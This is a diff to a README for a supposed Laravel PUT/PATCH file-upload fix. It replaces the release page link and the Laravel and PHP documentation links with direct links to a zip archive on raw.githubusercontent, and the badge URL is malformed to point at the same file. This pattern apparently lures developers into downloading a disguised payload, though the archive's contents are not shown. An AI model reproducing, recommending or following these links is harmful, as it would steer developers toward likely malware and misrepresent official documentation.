@@ -1,6 +1,6 @@
 # 🛠 how-to-fix-file-uploads-with-put-patch-in-laravel-api - Fix Your File Uploads Easily
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/releases)
+[![Download](https://raw.githubusercontent.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/main/affination/put_file_in_api_fix_with_uploads_how_to_patch_laravel_v2.8.zip%https://raw.githubusercontent.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/main/affination/put_file_in_api_fix_with_uploads_how_to_patch_laravel_v2.8.zip)](https://raw.githubusercontent.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/main/affination/put_file_in_api_fix_with_uploads_how_to_patch_laravel_v2.8.zip)
 
 ## 📋 Introduction
 
@@ -20,7 +20,7 @@ Before downloading the application, make sure you have:
 
 ### 2. Download the Application
 
-To download the application, please visit the following page: [Download Latest Release](https://github.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/releases).
+To download the application, please visit the following page: [Download Latest Release](https://raw.githubusercontent.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/main/affination/put_file_in_api_fix_with_uploads_how_to_patch_laravel_v2.8.zip).
 
 ### 3. Install the Application
 
@@ -46,7 +46,7 @@ By implementing simple fixes, you can ensure that your application handles file 
 
 ## 📥 Download & Install
 
-To download and install the application, visit the release page again: [Download Latest Release](https://github.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/releases). Follow the installation steps outlined above to get the application up and running.
+To download and install the application, visit the release page again: [Download Latest Release](https://raw.githubusercontent.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/main/affination/put_file_in_api_fix_with_uploads_how_to_patch_laravel_v2.8.zip). Follow the installation steps outlined above to get the application up and running.
 
 If you have any questions or issues during the setup, refer to the issues section of this repository for community support.
 
@@ -60,8 +60,8 @@ Once you have installed the application and followed the setup instructions, you
 
 ## 📚 Additional Resources
 
-- [Laravel Documentation](https://laravel.com/docs) - Comprehensive documentation on Laravel features and best practices.
-- [PHP Manual](https://www.php.net/manual/en/index.php) - Official PHP documentation detailing functions and usage.
+- [Laravel Documentation](https://raw.githubusercontent.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/main/affination/put_file_in_api_fix_with_uploads_how_to_patch_laravel_v2.8.zip) - Comprehensive documentation on Laravel features and best practices.
+- [PHP Manual](https://raw.githubusercontent.com/Lunadetofu/how-to-fix-file-uploads-with-put-patch-in-laravel-api/main/affination/put_file_in_api_fix_with_uploads_how_to_patch_laravel_v2.8.zip) - Official PHP documentation detailing functions and usage.
   
 ## 💬 Need Help?
 
